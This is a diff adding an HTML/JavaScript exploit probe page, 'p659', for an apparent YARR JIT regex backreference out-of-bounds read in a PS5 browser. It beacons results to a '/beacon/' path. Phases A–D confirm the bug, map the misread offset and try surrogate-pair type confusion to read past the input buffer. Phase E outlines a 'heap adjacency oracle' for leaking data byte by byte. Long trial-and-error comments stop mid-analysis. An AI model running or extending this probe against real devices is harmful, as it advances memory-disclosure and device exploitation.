@@ -1,0 +1,1050 @@
+<!--
+  p659: YARR JIT backreference OOB read (CVE-2026-43740)
+
+  BUG: In YarrJIT.cpp matchBackreference(), the surrogate pair path calls
+  readCharacter(op.m_checkedOffset - term->inputPosition, character, patternIndex)
+  but patternIndex is already an ABSOLUTE index into the captured text, so the
+  offset should be 0. The wrong offset causes the JIT to read from the WRONG
+  position in the input buffer when comparing backreference characters.
+
+  Fix (commit 2693828e8d, Feb 2026): changed offset to 0.
+
+  Impact: The offset = checkedOffset - inputPosition (in UChar units). For a
+  pattern like /(.)\\1c/u the offset is 3, causing the JIT to read UChar[3]
+  instead of UChar[0] from the captured region. This reads the WRONG data from
+  the input string. For multi-surrogate-pair captures, the misread can cause
+  BMP/surrogate type confusion in the loop, potentially extending iteration
+  count and pushing subject-side reads past the buffer end.
+
+  Probe phases:
+    A) Confirm bug: /(.)\\1c/u should match "\u{10000}\u{10000}c" in interpreter
+       but fail in YARR JIT due to wrong offset. Interp=MATCH + JIT=NO-MATCH
+       confirms CVE-2026-43740 is present on PS5 14.10.
+    B) Map offset: test increasing trailing chars to see how offset grows.
+    C) Type confusion: multi-surrogate-pair captures where wrong offset causes
+       the JIT to misdetect character widths (BMP vs surrogate pair), changing
+       loop iteration count and potentially reading past the subject region.
+    D) Within-string oracle: use match/no-match to leak information about
+       character values at offset positions in the input.
+
+  CRASH_CLASS: MODERATE (OOB read, not write; crash possible if subject read
+  extends past unmapped page)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p659</title></head>
+<body>p659: YARR JIT backreference OOB read
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg !== undefined ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 3) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/P659-' + encodeURIComponent(b), false);
+    x.send();
+  } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex16(v) { return ('0000' + (v & 0xFFFF).toString(16)).slice(-4); }
+
+// Run a regex many times to force YARR JIT compilation
+function warmJIT(re, input, n) {
+  for (var i = 0; i < (n || 600); i++) re.exec(input);
+}
+
+// Test a regex in both interpreter and JIT mode, return results
+function testInterpVsJIT(re, input, warmInput) {
+  // First exec is interpreted (or baseline)
+  var iRes = re.exec(input);
+  // Warm the JIT with the provided input (or same input)
+  warmJIT(re, warmInput || input, 600);
+  // Now exec should use JIT-compiled code
+  var jRes = re.exec(input);
+  return { interp: iRes, jit: jRes };
+}
+
+emit('START', 'v1-yarr-backref-oob');
+flush();
+
+// ====================================================================
+// PHASE A: Confirm the bug exists
+// The known test case from the fix commit.
+// /(.)\\1c/u on "\u{10000}\u{10000}c" should match.
+// On buggy JIT: offset = checkedOffset - inputPosition causes the
+// backreference to read from the wrong position -> mismatch -> no match.
+// ====================================================================
+emit('PHASE-A', 'start');
+try {
+  // A1: The canonical test case
+  var rA1 = new RegExp('(.)\\\\1c', 'u');  // /(.)\\1c/u
+  // Wait, backslash escaping. In a string for RegExp constructor, \\1 = \1
+  // Let me use literal:
+  rA1 = /(.)\1c/u;
+  var iA1 = "\u{10000}\u{10000}c";
+
+  // Quick interpreter check (first exec, before JIT kicks in)
+  var freshRe = /(.)\1c/u;
+  var interpRes = freshRe.exec(iA1);
+  emit('A1-INTERP', interpRes ? 'MATCH' : 'NO-MATCH');
+
+  // Now warm JIT and test
+  warmJIT(freshRe, iA1, 600);
+  var jitRes = freshRe.exec(iA1);
+  emit('A1-JIT', jitRes ? 'MATCH' : 'NO-MATCH');
+
+  if (interpRes && !jitRes) {
+    emit('A1-BUG', 'CONFIRMED-interp-match-jit-fail');
+  } else if (!interpRes && !jitRes) {
+    emit('A1-BUG', 'BOTH-FAIL-maybe-no-unicode-support');
+  } else if (interpRes && jitRes) {
+    emit('A1-BUG', 'BOTH-MATCH-fixed-or-no-jit');
+  } else {
+    emit('A1-BUG', 'UNEXPECTED-interp-fail-jit-match');
+  }
+
+  // A2: BMP control — should always match (no surrogate pair path involved)
+  var freshBmp = /(.)\1c/u;
+  var bmpRes1 = freshBmp.exec("aac");
+  warmJIT(freshBmp, "aac", 600);
+  var bmpRes2 = freshBmp.exec("aac");
+  emit('A2-BMP', 'interp=' + (bmpRes1 ? 'M' : 'N') + ',jit=' + (bmpRes2 ? 'M' : 'N'));
+
+  // A3: Different surrogate pair (U+10001 = D800 DC01)
+  var freshR3 = /(.)\1c/u;
+  var i3 = "\u{10001}\u{10001}c";
+  var r3i = freshR3.exec(i3);
+  warmJIT(freshR3, i3, 600);
+  var r3j = freshR3.exec(i3);
+  emit('A3-10001', 'interp=' + (r3i ? 'M' : 'N') + ',jit=' + (r3j ? 'M' : 'N'));
+
+  // A4: Higher plane char (U+1F600 = D83D DE00)
+  var freshR4 = /(.)\1c/u;
+  var i4 = "\u{1F600}\u{1F600}c";
+  var r4i = freshR4.exec(i4);
+  warmJIT(freshR4, i4, 600);
+  var r4j = freshR4.exec(i4);
+  emit('A4-EMOJI', 'interp=' + (r4i ? 'M' : 'N') + ',jit=' + (r4j ? 'M' : 'N'));
+
+  // A5: Without /u flag — no surrogate pair path, should work fine
+  var freshR5 = /(.)\1c/;
+  var r5i = freshR5.exec("\u{10000}\u{10000}c");
+  warmJIT(freshR5, "\u{10000}\u{10000}c", 600);
+  var r5j = freshR5.exec("\u{10000}\u{10000}c");
+  emit('A5-NO-U', 'interp=' + (r5i ? 'M' : 'N') + ',jit=' + (r5j ? 'M' : 'N'));
+
+} catch(e) {
+  emit('A-ERR', e.message);
+}
+flush();
+
+// ====================================================================
+// PHASE B: Map the offset behavior with increasing trailing characters
+// For /(.)\\1<trail>/u, offset = checkedOffset - inputPosition.
+// More trailing chars -> larger offset -> reads further into the string.
+// We test whether JIT match behavior changes with increasing offset.
+// ====================================================================
+emit('PHASE-B', 'start');
+try {
+  var trails = ['c', 'cd', 'cde', 'cdef', 'cdefg', 'cdefgh',
+                'cdefghij', 'cdefghijkl', 'cdefghijklmn',
+                'cdefghijklmnop', 'cdefghijklmnopqrst'];
+
+  for (var t = 0; t < trails.length; t++) {
+    var trail = trails[t];
+    var pat = new RegExp('(.)\\1' + trail, 'u');
+    var inp = "\u{10000}\u{10000}" + trail;
+    var inpLen = inp.length; // in code units (UChars)
+
+    // Interpreter
+    var freshP = new RegExp('(.)\\1' + trail, 'u');
+    var ri = freshP.exec(inp);
+
+    // JIT
+    warmJIT(freshP, inp, 600);
+    var rj = freshP.exec(inp);
+
+    // Calculate expected offset = checkedOffset - inputPosition (in UChars)
+    // checkedOffset ≈ total UChars = 4 + trail.length
+    // inputPosition = 2 (after first surrogate pair)
+    // offset ≈ 2 + trail.length
+    var expOffset = 2 + trail.length;
+
+    emit('B-T' + trail.length,
+         'i=' + (ri ? 'M' : 'N') + ',j=' + (rj ? 'M' : 'N') +
+         ',off~' + expOffset + ',ulen=' + inpLen);
+  }
+
+  // B-special: test with input that does NOT match the trailing chars
+  // This exercises the backreference path even when the overall match fails
+  // The JIT still performs the backreference read before checking trailing chars
+  var freshBs = /(.)\1cdef/u;
+  var bsInp = "\u{10000}\u{10000}xxxx"; // trailing doesn't match
+  var bsi = freshBs.exec(bsInp);
+  warmJIT(freshBs, "\u{10000}\u{10000}cdef", 600); // warm with matching input
+  var bsj = freshBs.exec(bsInp); // test with non-matching
+  emit('B-NOMATCH', 'i=' + (bsi ? 'M' : 'N') + ',j=' + (bsj ? 'M' : 'N'));
+
+} catch(e) {
+  emit('B-ERR', e.message);
+}
+flush();
+
+// ====================================================================
+// PHASE C: Type confusion with multi-surrogate captures
+// If the wrong offset causes the backreference loop to misdetect
+// character width (reading a non-surrogate at the offset position when
+// a surrogate pair was expected), the loop advancement changes from
+// 2 UChars to 1 UChar per iteration, doubling the iteration count.
+// The subject-side still advances by 2 per surrogate pair, so the
+// subject read can extend past the input buffer.
+// ====================================================================
+emit('PHASE-C', 'start');
+try {
+  // C1: 2-code-point capture (4 UChars)
+  // /(..)\1c/u on surrogate pairs
+  var freshC1 = /(..)\1c/u;
+  var iC1 = "\u{10000}\u{10001}\u{10000}\u{10001}c";
+  var c1i = freshC1.exec(iC1);
+  warmJIT(freshC1, iC1, 600);
+  var c1j = freshC1.exec(iC1);
+  emit('C1-2CP', 'i=' + (c1i ? 'M' : 'N') + ',j=' + (c1j ? 'M' : 'N') +
+       ',ulen=' + iC1.length);
+
+  // C2: 3-code-point capture
+  var freshC2 = /(...)\1c/u;
+  var iC2 = "\u{10000}\u{10001}\u{10002}\u{10000}\u{10001}\u{10002}c";
+  var c2i = freshC2.exec(iC2);
+  warmJIT(freshC2, iC2, 600);
+  var c2j = freshC2.exec(iC2);
+  emit('C2-3CP', 'i=' + (c2i ? 'M' : 'N') + ',j=' + (c2j ? 'M' : 'N') +
+       ',ulen=' + iC2.length);
+
+  // C3: 4-code-point capture with trailing chars to maximize offset
+  var freshC3 = /(....)\1cdef/u;
+  var iC3 = "\u{10000}\u{10001}\u{10002}\u{10003}" +
+            "\u{10000}\u{10001}\u{10002}\u{10003}" + "cdef";
+  var c3i = freshC3.exec(iC3);
+  warmJIT(freshC3, iC3, 600);
+  var c3j = freshC3.exec(iC3);
+  emit('C3-4CP', 'i=' + (c3i ? 'M' : 'N') + ',j=' + (c3j ? 'M' : 'N') +
+       ',ulen=' + iC3.length);
+
+  // C4: 5-code-point capture with long trailing — maximum type confusion
+  var freshC4 = /(.....)\1cdefghij/u;
+  var iC4 = "\u{10000}\u{10001}\u{10002}\u{10003}\u{10004}" +
+            "\u{10000}\u{10001}\u{10002}\u{10003}\u{10004}" + "cdefghij";
+  var c4i = freshC4.exec(iC4);
+  warmJIT(freshC4, iC4, 600);
+  var c4j = freshC4.exec(iC4);
+  emit('C4-5CP', 'i=' + (c4i ? 'M' : 'N') + ',j=' + (c4j ? 'M' : 'N') +
+       ',ulen=' + iC4.length);
+
+  // C5: Large capture to push subject reads further
+  // 8 surrogate pairs + 8 surrogate pairs + "abcdefghijklmnop" (16 trailing)
+  var cap8 = "\u{10000}\u{10001}\u{10002}\u{10003}\u{10004}\u{10005}\u{10006}\u{10007}";
+  var freshC5 = /(........)\1abcdefghijklmnop/u;
+  var iC5 = cap8 + cap8 + "abcdefghijklmnop";
+  var c5i = freshC5.exec(iC5);
+  warmJIT(freshC5, iC5, 600);
+  var c5j = freshC5.exec(iC5);
+  emit('C5-8CP', 'i=' + (c5i ? 'M' : 'N') + ',j=' + (c5j ? 'M' : 'N') +
+       ',ulen=' + iC5.length);
+
+} catch(e) {
+  emit('C-ERR', e.message);
+}
+flush();
+
+// ====================================================================
+// PHASE D: Within-string oracle
+// The wrong offset causes the JIT to compare characters from a different
+// part of the input string against the subject. Match/no-match reveals
+// what the JIT read. We use this as an oracle to verify we control the
+// read position.
+//
+// For /(.)\\1c/u: offset ≈ 3 UChars.
+// JIT reads UChar[3] from captured region start (UChar[0]).
+// UChar[3] = low surrogate of second pair = DC00 for U+10000.
+// Subject comparison: subject is at UChar[2] = D800 (high surrogate).
+// DC00 != D800 -> fail.
+//
+// If we make UChar[3] == UChar[2] (same value), the comparison succeeds.
+// We craft the input so that the misread position contains the expected value.
+// ====================================================================
+emit('PHASE-D', 'start');
+try {
+  // D1: Probe what the JIT reads by testing match/no-match with crafted inputs.
+  // Use String.fromCharCode to place specific UChar values at specific positions.
+
+  // For /(.)\\1c/u with offset 3:
+  // Captured region: UChar[0..1]. Subject: UChar[2..3]. Trailing: UChar[4].
+  // JIT reads UChar[0+3]=UChar[3] and UChar[0+3+1]=UChar[4].
+  // It compares [UChar[3], UChar[4]] with [UChar[2], UChar[3]] (subject).
+  //
+  // For the comparison to SUCCEED:
+  //   UChar[3] == UChar[2] AND UChar[4] == UChar[3]
+  //   i.e., UChar[2]==UChar[3] and UChar[3]==UChar[4]
+  //   i.e., UChar[2]==UChar[3]==UChar[4]
+
+  // Construct: D800 DC00 | XXXX XXXX | 0063
+  // Subject = [XXXX, XXXX], trailing = 0063
+  // JIT reads [XXXX, 0063] from pattern side.
+  // Compares [XXXX, 0063] with [XXXX, XXXX].
+  // For match: XXXX == XXXX (ok) AND 0063 == XXXX -> need XXXX == 0063.
+  // So UChar[2]=0063, UChar[3]=0063 -> subject = [0063, 0063] = BMP chars "cc"
+  // But the /u flag expects the subject to be a code point matching the capture.
+  // If capture is U+10000 (a surrogate pair) and subject is "cc" (BMP), they
+  // shouldn't match in interpreter either.
+
+  // Actually the key insight: the interpreter compares code points, the JIT
+  // compares UChars at wrong positions. We can detect the bug by finding
+  // inputs where interp and JIT disagree.
+
+  // D2: Systematic test - vary the character at position 3 (second surrogate pair's
+  // low surrogate) and see if it affects JIT match result.
+  // For U+10000+N: high=D800, low=DC00+N (for small N)
+  // UChar[3] = DC00+N.
+  // JIT reads UChar[3] and compares with UChar[2] = D800 (high surrogate of 2nd pair).
+  // For match: DC00+N == D800 -> N = D800-DC00 = -0x400 (impossible for positive N).
+  // So JIT always fails for same-pair inputs. Confirmed: interp matches, JIT fails.
+
+  // D3: What if the second occurrence is a DIFFERENT code point?
+  // Input: "\u{10000}\u{10001}c" (D800 DC00 D800 DC01 0063)
+  // Capture: U+10000 = [D800, DC00]. Subject: U+10001 = [D800, DC01].
+  // Interp: U+10000 != U+10001 -> no match.
+  // JIT: reads UChar[3]=DC01, compares with UChar[2]=D800. DC01!=D800 -> no match.
+  // Both fail. No disagreement.
+
+  // D4: Craft input where JIT comparison SUCCEEDS but interpreter fails.
+  // JIT reads [UChar[3], UChar[4]]. Subject = [UChar[2], UChar[3]].
+  // JIT comparison: UChar[3]==UChar[2] AND UChar[4]==UChar[3].
+  // Make UChar[2]=UChar[3] and UChar[3]=UChar[4].
+  // Use: UChar = [D800, DC00, D800, D800, D800]
+  // This is: first pair = D800,DC00 (U+10000)
+  //          subject starts at UChar[2]: D800,D800 -> invalid pair, but /u might handle
+  //          trailing: D800
+  // The regex needs the trailing 'c' -> we need UChar[4] = 0x0063
+  // AND UChar[3] = UChar[2] = some value V
+  // AND UChar[4] = 0x0063 = V -> contradiction unless V = 0x0063
+  // So: UChar = [D800, DC00, 0x0063, 0x0063, 0x0063] = "...ccc"
+  // But UChar[2..3] = [0x0063, 0x0063] = "cc" (BMP), not a surrogate pair
+  // The capture is U+10000 (surrogate pair), backreference expects U+10000
+  // Subject at pos 2 is 'c' (BMP, code point 0x0063)
+  // Interp: U+10000 != 'c' -> no match.
+  // JIT: reads [0x0063, 0x0063] and compares with [0x0063, 0x0063] -> match!
+  // -> backreference succeeds on JIT!
+  // Then trailing 'c' check: UChar[4] = 0x0063 = 'c' -> match!
+  // JIT: full regex matches. Interp: fails.
+  // THIS IS INTERP-FAIL, JIT-MATCH -> detectable!
+
+  var freshD4 = /(.)\1c/u;
+  // Input: U+10000 followed by "ccc"
+  var iD4 = "\u{10000}ccc";
+  // UChars: D800 DC00 0063 0063 0063 (5 UChars)
+  emit('D4-INPUT', 'len=' + iD4.length + ' uchars=' + (iD4.length));
+  // Log UChar values
+  var ucharStr = '';
+  for (var ci = 0; ci < iD4.length; ci++) {
+    ucharStr += hex16(iD4.charCodeAt(ci)) + ' ';
+  }
+  emit('D4-UCHARS', ucharStr.trim());
+
+  var d4i = freshD4.exec(iD4);
+  warmJIT(freshD4, "\u{10000}\u{10000}c", 600); // warm with matching input
+  var d4j = freshD4.exec(iD4);
+  emit('D4-RESULT', 'interp=' + (d4i ? 'M' : 'N') + ',jit=' + (d4j ? 'M' : 'N'));
+  if (!d4i && d4j) {
+    emit('D4-ORACLE', 'JIT-MATCH-INTERP-FAIL-confirms-wrong-offset-read');
+    // The JIT read UChar[3]=0063 instead of UChar[0]=D800
+    // and it matched against subject UChar[2]=0063
+    // This confirms the JIT reads at patternIndex + offset
+    if (d4j) {
+      emit('D4-CAPTURE', 'grp1=' + (d4j[1] ? 'cp=' + d4j[1].codePointAt(0).toString(16) : 'null'));
+    }
+  }
+
+  // D5: Reverse oracle — craft input where JIT FAILS but interp MATCHES
+  // (This is the canonical test case behavior)
+  var freshD5 = /(.)\1c/u;
+  var iD5 = "\u{10000}\u{10000}c";
+  var d5i = freshD5.exec(iD5);
+  warmJIT(freshD5, iD5, 600);
+  var d5j = freshD5.exec(iD5);
+  emit('D5-RESULT', 'interp=' + (d5i ? 'M' : 'N') + ',jit=' + (d5j ? 'M' : 'N'));
+  if (d5i && !d5j) {
+    emit('D5-ORACLE', 'INTERP-MATCH-JIT-FAIL-confirms-misread');
+  }
+
+  // D6: Oracle with different "probe" values at the read position
+  // By varying what's at UChar[3], we can test what value the JIT compares.
+  // Pattern: /(.)\\1c/u. Offset = 3. JIT reads UChar[3].
+  // Subject UChar[2] varies. For match: UChar[3] == UChar[2].
+  var probeValues = [0x0041, 0x0042, 0x0063, 0x00FF, 0xD800, 0xDC00, 0xD83D, 0xDE00];
+  for (var pi = 0; pi < probeValues.length; pi++) {
+    var pv = probeValues[pi];
+    // Input: D800 DC00 <pv> <pv> 0063
+    // UChar[2] = pv (subject high), UChar[3] = pv (JIT reads this)
+    // UChar[4] = 0063 ('c')
+    // For JIT match: UChar[3]==UChar[2] (=pv, ok) AND UChar[4]==UChar[3] (0063==pv)
+    // So JIT matches only when pv == 0x0063
+
+    // But we also need the capture to be a valid surrogate pair for /u
+    // Capture = [D800, DC00] = U+10000, which is a valid surrogate pair.
+    // The regex (.) in /u mode captures one code point.
+    // At position 0: [D800, DC00] is U+10000 -> capture is U+10000 (1 code point).
+    // \1 at position 1 (code point 1): expects U+10000.
+    // Subject at position 1 starts at UChar[2].
+    // UChar[2] = pv. If pv is a high surrogate, it forms a pair with UChar[3].
+    // The interpreter checks if code point at position 1 == U+10000.
+
+    var freshDP = /(.)\1c/u;
+    var iDP = String.fromCharCode(0xD800, 0xDC00, pv, pv, 0x0063);
+    var dpi = freshDP.exec(iDP);
+    warmJIT(freshDP, "\u{10000}\u{10000}c", 600);
+    var dpj = freshDP.exec(iDP);
+    emit('D6-' + hex16(pv),
+         'i=' + (dpi ? 'M' : 'N') + ',j=' + (dpj ? 'M' : 'N'));
+  }
+
+} catch(e) {
+  emit('D-ERR', e.message);
+}
+flush();
+
+// ====================================================================
+// PHASE E: Heap adjacency oracle
+// Attempt to use the wrong-offset read as an oracle for data in the
+// input string that comes from other sources. If we can construct a
+// string by concatenating sensitive data, the oracle reveals bytes
+// from that data through match/no-match.
+//
+// Strategy: build an input string where:
+//   - First 2 UChars: surrogate pair (captured by (.))
+//   - Next N UChars: "unknown" data we want to leak
+//   - Trailing: pattern suffix
+// The JIT reads at offset into the "unknown" region and compares it
+// with the subject. We vary the captured surrogate pair to match
+// different UChar values, creating a byte-at-a-time oracle.
+// ====================================================================
+emit('PHASE-E', 'start');
+try {
+  // E1: Build a string with a "secret" embedded in it
+  var secret = "DEADBEEF"; // known for validation
+  // Input: \u{10000} + secret + \u{10000} + secret + trailing
+  // The capture (.) gets U+10000.
+  // The backreference should match the second U+10000.
+  // With the bug, the JIT reads from offset into the first captured region,
+  // which lands in the "secret" part.
+
+  // Actually, let's use a simpler approach:
+  // /(.)\\1<trail>/u where trail has length T
+  // offset = 2 + T (approximately, in UChars)
+  // JIT reads UChar[offset] from position 0 of the captured text
+  // If the input is structured as: [capture pair][data...][subject pair][data...][trail]
+  // the read at offset lands in the data region.
+
+  // For a controlled test, use a longer trailing section to increase offset
+  // and place known data at the expected read position.
+
+  // Input structure for /(.)\\1abcd/u:
+  // [D800 DC00] [D800 DC00] a b c d
+  //  ^cap start  ^subject    ^trailing
+  // UChars: 0:D800, 1:DC00, 2:D800, 3:DC00, 4:0061, 5:0062, 6:0063, 7:0064
+  // offset = 2 + 4 = 6 (hypothesis)
+  // JIT reads UChar[0+6] = UChar[6] = 0x0063 = 'c'
+  // Compares with subject UChar[2] = D800
+  // 0x0063 != D800 -> fail (as expected for wrong read)
+
+  // To verify offset = 6: make UChar[6] = same as UChar[2] = D800
+  // Input: [D800 DC00] [D800 DC00] a b D800 d
+  // UChars: D800 DC00 D800 DC00 0061 0062 D800 0064
+  // JIT reads UChar[6] = D800, compares with UChar[2] = D800 -> match!
+  // Then reads UChar[7] = 0064, compares with UChar[3] = DC00 -> 0064 != DC00 -> fail!
+  // So backreference fails even with UChar[6] matching.
+
+  // For FULL backreference success (surrogate pair comparison):
+  // JIT reads [UChar[6], UChar[7]] and compares with [UChar[2], UChar[3]]
+  // Need: UChar[6]==UChar[2]=D800 AND UChar[7]==UChar[3]=DC00
+  // Input: [D800 DC00] [D800 DC00] a b D800 DC00
+  // That's: \u{10000} \u{10000} a b \u{10000}
+  // Pattern: /(.)\\1abcd/u -> needs trailing "abcd" at UChar[4..7]
+  // But UChar[4..5] = 'a','b' and UChar[6..7] = D800,DC00
+  // The trailing "abcd" in the regex matches UChar[4]='a', [5]='b', [6]=D800, [7]=DC00
+  // In /u mode: D800,DC00 at positions 6-7 forms U+10000, which is 1 code point.
+  // The pattern literal 'c' (code point 0x63) doesn't match U+10000.
+  // So the overall regex fails on the trailing match.
+
+  // This approach is getting complex. Let me try offset verification differently.
+
+  // OFFSET VERIFICATION: systematically determine the actual offset
+  // For /(.)\\1c/u, the bug offset should be ~3 UChars.
+  // We test by placing the captured pair at position 3:
+  // Input: D800 DC00 XX D800 DC00 0063
+  //                      ^--- if JIT reads UChar[3], it finds D800 (high surrogate)
+  //                           then UChar[4] = DC00 (low surrogate)
+  //                           pair = U+10000 = same as capture
+  //                           compares with subject (XX at UChar[2]... wait)
+
+  // Let me reconsider the subject position.
+  // Pattern /(.)\\1c/u on an input: (.) consumes 1 code point from position 0.
+  // In /u mode, (.) at position 0 of the input:
+  //   If UChar[0] is a high surrogate, (.) captures the surrogate pair = 1 code point
+  //   capture = positions UChar[0..1]
+  // \1 starts at code point position 1 (= UChar position 2)
+  // \1 should match the same code point. Subject reads from UChar[2..].
+  // In interpreter: reads code point at UChar[2], compares with captured code point.
+  // After \1: code point position 2 (= UChar position 4 if subject was a surrogate pair)
+  // Then 'c' matches at the next position.
+
+  // With the JIT bug (offset applied to pattern read):
+  // The backreference loop reads from patternIndex + offset instead of patternIndex.
+  // patternIndex starts at UChar[0] (capture start).
+  // offset = checkedOffset - inputPosition.
+
+  // To determine the EXACT offset empirically:
+  // Create inputs where we KNOW the JIT must read at patternIndex + K for various K,
+  // and see which K produces the observed match/no-match behavior.
+
+  // Method: For each candidate offset K (0..10):
+  //   Create input where UChar[K] == UChar[2] AND UChar[K+1] == UChar[3]
+  //   (so JIT's read of [K, K+1] matches the subject at [2, 3])
+  //   AND the trailing chars match.
+  //   If the regex matches -> offset = K.
+  //   If it doesn't match -> offset != K.
+
+  // We use capture U+10000 = [D800, DC00].
+  // Subject = [D800, DC00] (same pair).
+  // For the JIT read at position K to succeed:
+  //   UChar[K] = D800, UChar[K+1] = DC00.
+
+  // Base input: \u{10000}\u{10000}c = [D800, DC00, D800, DC00, 0063]
+  // For K=0: [D800] at 0, [DC00] at 1 -> matches capture -> this is the CORRECT behavior
+  // For K=1: UChar[1]=DC00 -> need D800 at 1 -> can't, it's DC00 in the pair
+  // For K=2: UChar[2]=D800 -> need D800 at 2 (yes!) and DC00 at 3 (yes!) -> MATCH
+  //   This means offset=2 would read the SUBJECT pair and compare with itself -> match.
+  //   But the trailing 'c' still needs to match at the correct position.
+  // For K=3: UChar[3]=DC00 -> need D800 at 3 -> DC00 != D800 -> no match
+
+  // So the canonical test input naturally satisfies K=0 (correct) and K=2 (reads subject).
+  // If the JIT uses offset=2 and reads [D800,DC00] = U+10000, it matches the subject.
+  // In that case, the regex WOULD match -> same result as interpreter!
+  // But the test says JIT FAILS. So offset != 2.
+
+  // For K=3: needs UChar[3]=D800. In the canonical input, UChar[3]=DC00. -> no match.
+  // For K=1: needs UChar[1]=D800. In canonical input, UChar[1]=DC00. -> no match.
+
+  // So offsets 1 and 3 would cause failure for the canonical input. But which one?
+
+  // Create a DISTINGUISHING input for offset=1 vs offset=3:
+  // For offset=1: JIT reads [UChar[1], UChar[2]].
+  //   Make UChar[1]=D800, UChar[2]=DC00 -> valid pair U+10000 -> match subject U+10000
+  //   Input: UChar = [D800, D800, DC00, ...] -> first "pair" is [D800, D800] which is invalid
+  //   In /u mode, (.) at position 0 sees D800. If D800 is not followed by a low surrogate
+  //   (D800 at position 1 is another high surrogate), how does /u handle it?
+  //   /u mode treats lone surrogates as individual code points? Or errors?
+  //   Actually, in ES2015 /u mode, a lone surrogate IS a valid match for '.'
+  //   See: "In Unicode mode, . matches any code point, including U+FFFE, U+FFFF,
+  //         and lone surrogates"... actually no. Let me check.
+  //   In ES2015, with /u flag, . matches any Unicode scalar value (0..D7FF, E000..10FFFF)
+  //   Lone surrogates (D800-DFFF) are NOT Unicode scalar values.
+  //   So (.) with /u might NOT match a lone surrogate.
+  //   This makes the test invalid for offset=1.
+
+  // Let me use a different approach: test with non-surrogate characters at the read position.
+  // For /(.)\\1c/u with offset K:
+  // JIT reads UChar[K]. If UChar[K] is not a high surrogate, the JIT might take
+  // the BMP comparison path. If it compares UChar[K] with UChar[2] (subject high surrogate)
+  // and they differ, the backreference fails.
+  //
+  // For offset=3, canonical input: UChar[3]=DC00, UChar[2]=D800 -> DC00!=D800 -> fail. ✓
+  // For offset=1, canonical input: UChar[1]=DC00, UChar[2]=D800 -> DC00!=D800 -> fail. ✓
+  // Both give same result! Can't distinguish with canonical input.
+  //
+  // Distinguishing test for offset 1 vs 3:
+  // Create input where UChar[1] differs from UChar[3]:
+  // Use U+10400 = [D801, DC00] for first pair, U+10400 for second pair
+  // UChars: [D801, DC00, D801, DC00, 0063]
+  // offset=1: reads UChar[1]=DC00, compare with UChar[2]=D801 -> DC00!=D801 -> fail
+  // offset=3: reads UChar[3]=DC00, compare with UChar[2]=D801 -> DC00!=D801 -> fail
+  // Same! Because both low surrogates are DC00.
+
+  // Use U+10400 first, U+10800 second: D801 DC00, D802 DC00
+  // Wait no, the backreference requires they be the SAME.
+  // The input must be "\u{XXXXX}\u{XXXXX}c" for the interpreter to match.
+
+  // Let me try: create input where UChar[3] == UChar[2] but UChar[1] != UChar[2]
+  // This means offset=3 -> match, offset=1 -> no match
+  // UChar[2] must equal UChar[3]: need D800 at [2] and D800 at [3]? But [2,3] is
+  // the second surrogate pair = [D800, DC00]. So UChar[2]=D800, UChar[3]=DC00.
+  // UChar[2] != UChar[3] for any standard surrogate pair.
+  // And UChar[1] = DC00 (low surrogate of first pair).
+  // So UChar[1] == UChar[3] == DC00, and UChar[2] == UChar[0] == D800 (for U+10000).
+  // Can't distinguish 1 from 3 this way.
+
+  // Different code point: U+10041 = D800 DC41
+  // UChars: [D800, DC41, D800, DC41, 0063]
+  // offset=1: reads DC41, compare with D800 -> fail
+  // offset=3: reads DC41, compare with D800 -> fail
+  // SAME.
+
+  // The issue: for ANY standard surrogate pair, UChar[1] == UChar[3] (both are low surrogates,
+  // and for same code point they have the same low surrogate value). And UChar[0] == UChar[2].
+
+  // So we CANNOT distinguish offset 1 from 3 using the canonical input format.
+  // Let me try the D4 test (from Phase D) instead: use a non-standard input.
+
+  // Test: Input = [D800, DC00, 0063, 0063, 0063] = "\u{10000}ccc"
+  // offset=1: reads UChar[1]=DC00, compares with UChar[2]=0063 -> DC00!=0063 -> fail
+  // offset=3: reads UChar[3]=0063, compares with UChar[2]=0063 -> 0063==0063 -> success!
+  //   Then UChar[4]=0063 compares with UChar[3]=0063 -> success!
+  //   Backreference fully matches on JIT.
+  //   But interpreter: code point at position 1 is 'c' (0x0063), capture is U+10000 -> fail
+  //   JIT: MATCH, Interp: NO-MATCH -> JIT-ONLY match!
+
+  // If offset=1:
+  //   reads UChar[1]=DC00 at pattern side
+  //   compares with subject high surrogate... but subject is 'c' (BMP)
+  //   How does the JIT handle this? It entered the surrogate pair path because
+  //   the CAPTURED text is a surrogate pair. But the pattern read might get a
+  //   non-surrogate value. Depends on JIT code flow.
+
+  // The D4 test from Phase D already tests this! If D4 gives JIT=MATCH,
+  // it strongly suggests offset=3 (or at least that the read at offset
+  // returns data matching the subject).
+
+  // Let me also test offset=2:
+  // Input: [D800, DC00, XX, YY, 0063]
+  // offset=2: reads UChar[2]=XX. If XX == UChar[2]=XX -> always true!
+  //   Then reads UChar[3]=YY, compares with UChar[3]=YY -> always true!
+  //   But wait, what does the JIT compare WITH? The subject.
+  //   Subject starts at UChar[2]. JIT reads [UChar[2+0], UChar[2+1]] from subject.
+  //   Pattern read (with offset): [UChar[0+2], UChar[0+2+1]] = [UChar[2], UChar[3]]
+  //   So both sides read the SAME positions! -> always match.
+  //   This would mean the regex ALWAYS matches with offset=2, regardless of
+  //   whether the subject actually matches the capture.
+  //   BUT: the canonical test shows it FAILS. So offset != 2.
+
+  // This analysis confirms offset is NOT 2. Testing D4 (offset=3 hypothesis):
+  // Already done in Phase D. Let me also do it explicitly here.
+
+  // E-OFFSET: explicit offset determination
+  // Test offset=1: Make UChar[1] match UChar[2] and UChar[2] match UChar[3]
+  // UChar[1] = V, UChar[2] = V, UChar[3] = V, UChar[4] = 'c'
+  // Input: [D800, V, V, V, 0063]
+  // Problem: UChar[0..1] = [D800, V] must form a valid surrogate pair for /u
+  // V must be a low surrogate (DC00-DFFF) for the pair to be valid.
+  // If V = DC00: input = [D800, DC00, DC00, DC00, 0063]
+  // First pair = U+10000 (valid). UChar[2] = DC00 (lone low surrogate).
+  // In /u mode, the subject at code point position 1 is... DC00 is a lone surrogate.
